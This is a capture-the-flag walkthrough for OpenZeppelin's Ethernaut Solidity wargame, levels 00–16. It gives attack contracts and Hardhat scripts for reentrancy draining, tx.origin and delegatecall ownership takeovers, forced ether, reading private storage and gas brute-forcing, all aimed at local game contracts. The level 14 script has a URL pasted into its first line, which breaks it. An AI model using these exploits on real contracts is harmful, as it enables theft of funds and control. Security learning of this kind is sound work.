# Ethernaut

## Setup

Install and run locally, since the version on https://ethernaut.openzeppelin.com is in read-only mode

```sh
# Install nvm

git clone https://github.com/OpenZeppelin/ethernaut.git
cd ethernaut

nvm install # Use the version specified in .nvmrc
nvm use
npm install --global yarn
yarn install

# Launch a local network (in a separate shell) with `yarn network`
# Import one of the private keys into MetaMask

# Verify ACTIVE_NETWORK = NETWORKS.LOCAL in client/src/constants.js
yarn deploy:contracts
# It may be necessary to explicitly change http://localhost to http://127.0.0.1 in client/src/constants.js
# (Most /etc/hosts include an ipv6 entry for localhost which can apparently cause problems)
yarn start:ethernaut
```

## 00 Hello Ethernaut

```js
await contract.info()
await contract.info1()
await contract.info2("hello")

// Can tell infoNum() returns a uint8 from contract.abi
(await contract.infoNum()).toString()

await contract.info42()
await contract.theMethodName()
await contract.method7123949()
await contract.password()
await contract.authenticate("ethernaut0")
```

## 01 Fallback

```js
(await contract.contributions(await contract.owner())).toString()
await contract.contribute({value: 1})
(await contract.contributions(player)).toString()
await sendTransaction({to: contract.address, from: player, value: 1})
await contract.owner() == player
await contract.withdraw()
await getBalance(contract.address) == 0
```

## 02 Fallout

```js
// The Fal1out (sp) function is not a constructor
await contract.owner()
await contract.Fal1out()
await contract.owner() == player
```

## 03 Coin Flip

Create a Hardhat project

```sh
mkdir 03-coin-flip
cd 03-coin-flip
npm init -y
npm install -D hardhat
npx hardhat # Create a JavaScript project
```

With the following contract

```sol
pragma solidity ^0.8.0;

interface ICoinFlip {
  function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttack {
  ICoinFlip public target;

  constructor(address _target) {
    target = ICoinFlip(_target);
  }

  function attack() external {
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    bool side = coinFlip == 1 ? true : false;
    target.flip(side);
  }
}
```

Compile with `npx hardhat compile`

Create a deploy/execute script (as scripts/deploy.js)

```js
const hre = require("hardhat");

async function main() {
  const target = "<target contract address>";
  const contract = await hre.ethers.deployContract("CoinFlipAttack", [target]);
  await contract.waitForDeployment();
  console.log(`Contract address: ${await contract.getAddress()}`);

  for (let i=0; i<10; i++) {
    (await contract.attack()).wait();
    console.log(`Attack ${i+1} complete`);
  }
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
```

Include the local network in hardhat.config.js

```js
module.exports = {
  // ...
  networks: {
    ethernaut: {
      url: "http://127.0.0.1:8545",
      chainId: 1337,
      accounts: ["<private key>"]
    }
  }
}
```

Deploy/execute the contract with `npx hardhat run scripts/deploy.js --network ethernaut`

Can verify with `await contract.consecutiveWins() == 10` in the Ethernaut Javascript console

Note that when submitting the instance in the Ethernaut interface will need to update the nonce used by MetaMask since transactions occurred using Hardhat.  Enable this for the account in Settings, Advanced, Customize transaction nonce.

## 04 Telephone

Ref: https://ethereum.stackexchange.com/a/1892

```sol
pragma solidity ^0.8.0;

interface ITelephone {
  function changeOwner(address _owner) external;
}

contract TelephoneAttack {
  ITelephone public target;

  constructor(address _target) {
    target = ITelephone(_target);
  }

  function attack() external {
    target.changeOwner(tx.origin);
  }
}
```

## 05 Token

```js
(await contract.balanceOf(player)).toString()
(await contract.balanceOf(level)).toString()

// Must send to another address (ie not player) otherwise underflow effects will be negated
await contract.transfer(level, 21)

(await contract.balanceOf(player)).toString()
(await contract.balanceOf(level)).toString()
```

## 06 Delegation

In `npx hardhat console` execute `(new hre.ethers.Interface(["function pwn()"])).encodeFunctionData("pwn")` to get 0xdd365b8b

```js
await sendTransaction({to: contract.address, from: player, data: "0xdd365b8b"})
await contract.owner == player
```

## 07 Force

```sol
pragma solidity ^0.8.0;

contract ForceAttack {
  constructor(address payable target) payable {
    require(msg.value > 0);
    selfdestruct(target);
  }
}
```

Remember to include at least one wei with the deployment, ie `const contract = await hre.ethers.deployContract("ForceAttack", [target], {value: 1});`

Verify with `await getBalance(contract.address) > 0` in the Ethernaut Javascript console

## 08 Vault

```js
const hre = require("hardhat");

async function main() {
  const target = "<target contract address>";
  const value = await hre.ethers.provider.getStorage(target, 1);
  console.log(`value = ${value}`);
  console.log(`password = "${Buffer.from(value.substring(2), 'hex')}"`);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
```

```js
// The unlock function expects a bytes32 not a string ("A very strong secret password :)")
await contract.unlock("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")
await contract.locked() == false
```

## 09 King

```sol
pragma solidity ^0.8.0;

contract KingAttack {
  address payable public target;

  constructor(address payable _target) {
    target = _target;
  }

  function attack() external payable {
    // Cannot use transfer because it does not provide sufficient gas (hardcoded at 2300)
    // Ref: https://medium.com/coinmonks/solidity-transfer-vs-send-vs-call-function-64c92cfc878a
    // target.transfer(msg.value);

    (bool sent,) = target.call{value: msg.value}("");
    require(sent);
  }

  receive() external payable {
    revert();
  }
}
```

```js
const hre = require("hardhat");

async function main() {
  const target = "<target contract address>";
  const contract = await hre.ethers.deployContract("KingAttack", [target]);
  await contract.waitForDeployment();
  console.log(`Contract address: ${await contract.getAddress()}`);
  // One wei more than `await contract.prize()` from the Ethernaut Javascript console
  (await contract.attack({value: 1000000000000001})).wait();
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
```

## 10 Re-entrancy

```sol
pragma solidity ^0.8.0;

interface IReentrance {
  function donate(address _to) external payable;
  function withdraw(uint _amount) external;
}

contract ReentranceAttack {
  IReentrance target;
    
  constructor(address _target) payable {
    target = IReentrance(_target);
  }

  function attack() external payable {
    target.donate{value: msg.value}(address(this));
    target.withdraw(msg.value);
  }

  receive() external payable {
    if (address(target).balance >= msg.value) {
      target.withdraw(msg.value);
    }
  }
}
```

```js
const hre = require("hardhat");

async function main() {
  const target = "<target contract address>";
  const balance = await hre.ethers.provider.getBalance(target);
  console.log(`Target balance = ${balance}`);
  const amount = balance / 10n;

  const contract = await hre.ethers.deployContract("ReentranceAttack", [target]);
  await contract.waitForDeployment();
  console.log(`Contract address: ${await contract.getAddress()}`);
  (await contract.attack({value: amount})).wait();
  console.log("Attack complete");

  console.log(`Target balance = ${await hre.ethers.provider.getBalance(target)}`);
  console.log(`Contract balance = ${await hre.ethers.provider.getBalance(await contract.getAddress())}`);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
```

## 11 Elevator

```sol
pragma solidity ^0.8.0;

interface IElevator {
  function goTo(uint _floor) external;
}

contract ElevatorAttack {
  uint calls;

  function isLastFloor(uint) external returns (bool) {
    calls++;
    return calls % 2 == 0;
  }

  function attack(address target) external {
    IElevator(target).goTo(1);
  }
}
```

```js
const hre = require("hardhat");

async function main() {
  const target = (await hre.ethers.getContractFactory("Elevator")).attach("<target contract address>");
  console.log(`Target top = ${await target.top()}`);

  const contract = await hre.ethers.deployContract("ElevatorAttack");
  await contract.waitForDeployment();
  console.log(`Contract address: ${await contract.getAddress()}`);
  (await contract.attack(await target.getAddress())).wait();
  console.log("Attack complete");
  console.log(`Target top = ${await target.top()}`);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
```

## 12 Privacy

```js
const hre = require("hardhat");

async function main() {
  const target = (await hre.ethers.getContractFactory("Privacy")).attach("<target contract address>");
  console.log(`Target locked = ${await target.locked()}`);
  
  // Each variable occupies one 256-bit slot.
  // Several contiguous variables that occupy less than 256 bits are packed.
  for (let i = 0; i < 6; i++)
    console.log(`slot ${i}: ${await hre.ethers.provider.getStorage(await target.getAddress(), i)}`);

  const key = (await hre.ethers.provider.getStorage(await target.getAddress(), 5)).toString().substring(0, 2 + 32);
  console.log(`key = ${key}`);

  (await target.unlock(key)).wait();
  console.log(`Target locked = ${await target.locked()}`);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
```

## 13 Gatekeeper One

```sol
pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface IGatekeeperOne {
  function enter(bytes8 _gateKey) external;
}

contract GatekeeperOneAttack {
  function attack(address target, bytes8 gateKey, uint256 gas) external {
    // Note that console.log output will appear in the `yarn network` output.
    // Ref: https://hardhat.org/hardhat-network/docs/reference#console.log
    // Output using console.logBytes{8,4} for hex output.
    console.logBytes8(gateKey);
    console.logBytes4(bytes4(uint32(uint64(gateKey))));
    console.logBytes2(bytes2(uint16(uint64(gateKey))));

    require(uint32(uint64(gateKey)) == uint16(uint64(gateKey)), "GatekeeperOne: invalid gateThree part one");
    require(uint32(uint64(gateKey)) != uint64(gateKey), "GatekeeperOne: invalid gateThree part two");
    require(uint32(uint64(gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");

    IGatekeeperOne(target).enter{gas: gas}(gateKey);
  }
}
```

```js
const hre = require("hardhat");

async function main() {
  const target = (await hre.ethers.getContractFactory("GatekeeperOne")).attach("<target contract address>");
  console.log(`Target entrant = ${await target.entrant()}`);

  const contract = await hre.ethers.deployContract("GatekeeperOneAttack");
  await contract.waitForDeployment();
  console.log(`Contract address: ${await contract.getAddress()}`);

  const gateKey = await (async () => {
    const [ signer ] = await hre.ethers.getSigners();
    return "0x" + (hre.ethers.toBigInt(signer.address) & 0xffffffff_0000ffffn).toString(16);
  })();
  console.log(`gateKey = ${gateKey}`);

  for (let i = 0; i < 8191; i++) {
    console.log(`Testing ${i} gas offset`);
    try {
      (await contract.attack(await target.getAddress(), gateKey, 100000 + i)).wait();
      break;
    } catch {
    }
  }
  console.log("Attack complete");
  console.log(`Target entrant = ${await target.entrant()}`);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
```

## 14 Gatekeeper Two

```sol
pragma solidity ^0.8.0;

interface IGatekeeperTwo {
  function enter(bytes8 _gateKey) external;
}

contract GatekeeperTwoAttack {
  // Launching the attack from a constructor ensures extcodesize(caller()) == 0
  constructor(address target) {
    uint64 gateKey = uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ type(uint64).max;
    require(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ uint64(gateKey) == type(uint64).max);
    IGatekeeperTwo(target).enter(bytes8(gateKey));
  }
}
```

```js
const hre = require("hardhat");https://solidity-by-example.org/hacks/delegatecall/

async function main() {
  const target = (await hre.ethers.getContractFactory("GatekeeperTwo")).attach("<target contract address>");
  console.log(`Target entrant = ${await target.entrant()}`);

  const contract = await hre.ethers.deployContract("GatekeeperTwoAttack", [await target.getAddress()]);
  await contract.waitForDeployment();
  console.log(`Contract address: ${await contract.getAddress()}`);

  console.log(`Target entrant = ${await target.entrant()}`);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
```

## 15 Naught Coin

Change the NaughtCoin.sol import to be `@openzeppelin/contracts/token/ERC20/ERC20.sol` and run `npm install @openzeppelin/contracts`

```js
const hre = require("hardhat");

async function main() {
  const target = (await hre.ethers.getContractFactory("NaughtCoin")).attach("<target contract address>");

  const [ signer ] = await hre.ethers.getSigners();
  console.log(`Player address = ${signer.address}`);

  const balance = await target.balanceOf(signer.address);
  console.log(`Player balance = ${balance}`);

  // Note that the spender (first argument) here is the owner
  await target.approve(signer.address, balance);
  await target.transferFrom(signer.address, await target.getAddress() /* Or any address */, balance);
  console.log("Attack complete");

  console.log(`Player balance = ${await target.balanceOf(signer.address)}`);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
```

## 16 Preservation

```sol
pragma solidity ^0.8.0;

interface IPreservation {
  function setFirstTime(uint _timeStamp) external;
}

contract PreservationAttack {
  function attack(address target, address _library) external {
    // When using delegatecall the library and calling contract are expected to have the same state variable layout.
    // However LibraryContract's first state variable is storedTime and Preservation's is timeZone1Library,
    // so Preservation.setFirstTime() causes Preservation's first state variable (timeZone1Library) to be overwritten.
    // Ref: https://solidity-by-example.org/hacks/delegatecall/
    IPreservation(target).setFirstTime(uint(uint160(_library)));

    IPreservation(target).setFirstTime(0 /* Any value */);
  }
}

contract PreservationAttackLibrary {
  // Match the state variable layout of Preservation
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner;

  function setTime(uint _time) public {
    owner = tx.origin;
  }
}
```

```js
const hre = require("hardhat");

async function main() {
  const target = (await hre.ethers.getContractFactory("Preservation")).attach("<target contract address>");
  console.log(`Target owner = ${await target.owner()}`);

  const library = await hre.ethers.deployContract("PreservationAttackLibrary");
  await library.waitForDeployment();
  console.log(`Library address: ${await library.getAddress()}`);

  const contract = await hre.ethers.deployContract("PreservationAttack");
  await contract.waitForDeployment();
  console.log(`Contract address: ${await contract.getAddress()}`);

  (await contract.attack(await target.getAddress(), await library.getAddress())).wait();
  console.log("Attack complete");

  console.log(`Target owner = ${await target.owner()}`);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
```
